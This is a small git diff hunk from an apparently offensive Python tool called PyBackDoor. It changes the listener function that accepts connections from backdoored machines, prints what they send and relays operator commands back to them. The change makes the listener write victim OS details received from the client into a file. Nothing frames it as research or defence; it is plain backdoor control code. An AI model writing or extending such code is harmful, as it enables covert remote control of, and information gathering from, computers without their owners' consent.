@@ -11,6 +11,10 @@ def pybackdoor_listen(LHOST,LPORT):
     print("connection -> " + str(addr))
     while True:
         receiver = client.recv(1024).decode()
+        if '[OS INFO]' in receiver:
+            with open('client_info.txt','w') as session_file:
+                os_info = "PyBackDoor\n----------\nOS INFO \n "+receiver
+                session_file.write(os_info)
         print(receiver)
         cmd = input(str(addr)+"-> ")
         if cmd == "exit":
